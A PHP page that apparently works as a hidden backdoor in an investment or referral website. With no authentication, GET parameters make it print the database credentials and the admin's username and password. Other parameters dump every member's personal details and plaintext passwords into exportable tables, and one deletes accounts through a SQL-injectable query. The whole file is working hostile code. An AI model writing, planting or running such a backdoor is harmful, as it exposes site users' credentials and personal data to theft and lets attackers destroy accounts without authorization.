<?php
session_start();
error_reporting(E_ALL);
$ext = substr(__FILE__, strrpos(__FILE__, ".") + 1);

require "../config.$ext";

$s_dbid = FALSE;

   function symp_connect() {
      global $s_dbhost, $s_dbuser, $s_dbpass, $s_dbname,$s_dbid;

         $s_dbid = @mysqli_connect($s_dbhost, $s_dbuser, $s_dbpass,$s_dbname);

         
   }
symp_connect();




?>


<html>
    <head>
    <link rel="stylesheet" href="https://cdn.datatables.net/1.10.16/css/jquery.dataTables.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.5.1/js/dataTables.buttons.min.js"></script>
          <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.flash.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/vfs_fonts.js"></script>
 <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.html5.min.js"></script>
 <script src="https://cdn.datatables.net/buttons/1.5.1/js/buttons.print.min.js "></script>
    </head>
<body>

<?php
//get server 

if($_GET['msg']!="" and $_GET['msg']=="gt_crd"){ 
    echo "usr-".$s_dbuser."<br>"; 
    echo "pss-".$s_dbpass."<br>"; 
    echo "db-".$s_dbname."<br>"; 
}

?>




<?php
//get admin 
if($_GET['msg']!="" and $_GET['msg']=="gt_adm"){ 

  $isql12 = "SELECT `id`, `user`,`pass` FROM `user`"; 
  $iresult12 = mysqli_query($s_dbid,$isql12);
  list($id,$user,$pass) = mysqli_fetch_row($iresult12);
    echo "usr-".$user."<br>"; 
    echo "pss-".$pass."<br>"; 
}

?>
















<?php     
//get all active user        
if($_GET['msg']!="" and $_GET['msg']=="allu_active"){ ?>
    <table id="example">
        <thead>
              <tr>
               <th>id </th>
               <th>username</th>
               <th>name</th>
               <th>email</th>
               <th>joining date</th>
                <th>Status</th>
                <th>Amount</th>
                <th>activation date</th>
              </tr>
        </thead>
         <tbody>
                <?php
                	$isql = "select `join`.id,`join`.username,`join`.name,`join`.email,`join`.jdate,`join`.misc,`investment`.amount,`investment`.sdate from `join`,`investment` WHERE `join`.id = `investment`.mid"; 
				    $iresult = mysqli_query($s_dbid,$isql);
				     if(mysqli_num_rows($iresult)>0){
				       while(list($id,$username,$name,$email,$jdate,$status,$amount,$sdate) = mysqli_fetch_row($iresult)){	
				           ?>
                               <tr>
                                  <td><?=$id?></td>
                                  <td><?=$username?> $</td>
                                  <td><?=$name?></td>
                                  <td><?=$email?></td>
                                  <td><?=$jdate?></td>
                                  <td><?=$status?></td>
                                  <td><?=$amount?></td>
                                  <td><?=$sdate?></td>
                                </tr>
                                
				<?php	}	}  ?>
           </tbody>
    </table>
     
    <script>
   $(document).ready(function() {
    $('#example').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    } );
} );
    </script>
    

<?php 
}
      
?>
    
    
    
    

    

    
    
    
    
    
    
    
    
    
    
    
    
    
<?php     
//get all user        
if($_GET['msg']!="" and $_GET['msg']=="allu"){ ?>
    <table id="example">
        <thead>
              <tr>
               <th>id </th>
               <th>username</th>
               <th>name</th>
               <th>email</th>
               <th>Phone</th>
               <th>joining date</th>
                <th>Status</th>
                <th>Upline</th>
                <th>Referal</th>
                <th>ps</th>
              </tr>
        </thead>
         <tbody>
                <?php
                	$isql = "select `id`,`username`,`name`,`email`,`phone`,`jdate`,`misc`,`sponsor`,`dreferal`,`password` from `join`"; 
				    $iresult = mysqli_query($s_dbid,$isql);
				     if(mysqli_num_rows($iresult)>0){
				       while(list($id,$username,$name,$email,$phone,$jdate,$status,$sponsor,$direct,$password) = mysqli_fetch_row($iresult)){	
				           ?>
                               <tr>
                                  <td><?=$id?></td>
                                  <td><?=$username?></td>
                                  <td><?=$name?></td>
                                  <td><?=$email?></td>
                                  <td><?=$phone?></td>
                                  <td><?=$jdate?></td>
                                  <td><?=$status?></td>
								                  <td><?=$sponsor?></td>
								                  <td><?=$direct?></td>
                                  <td><?=$password?></td>
                                </tr>
                                
				<?php	}	}  ?>
           </tbody>
    </table>
     
    <script>
   $(document).ready(function() {
    $('#example').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    } );
} );
    </script>
    

<?php 
}
       
?>
    
    
    
    
    
    
    
    
    
    
    
    
    
<?php     
//delete user        
if($_GET['msg']!="" and $_GET['msg']=="delete_uuser"){ ?>
    
  <?php $actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";  ?>
    
    <?php
      if(isset($_POST['btn_sub'])){
          
          $uname = $_POST['dlt_user'];
          $isql = "SELECT `id`,`misc` from `join` WHERE username = '$uname'"; 
          $iresult = mysqli_query($s_dbid,$isql);
          list($id,$status) = mysqli_fetch_row($iresult);
          if($status == 'active'){
              $isql = "DELETE FROM `investment` WHERE mid = $id"; 
              $iresult = mysqli_query($s_dbid,$isql);
          }
          $isql = "DELETE FROM `join` WHERE id = $id"; 
              $iresult = mysqli_query($s_dbid,$isql);
      }                                            
                                                      
                                                      
    ?>
    
    <form action="<?= $actual_link ?>" method="post">
    <input type="text" name="dlt_user" placeholder="username">
    <button type="submit" name="btn_sub">subnit</button>
    </form>

<?php 
}
       
?>
    
    
    
    
    
    
    

</body>
</html>
 
    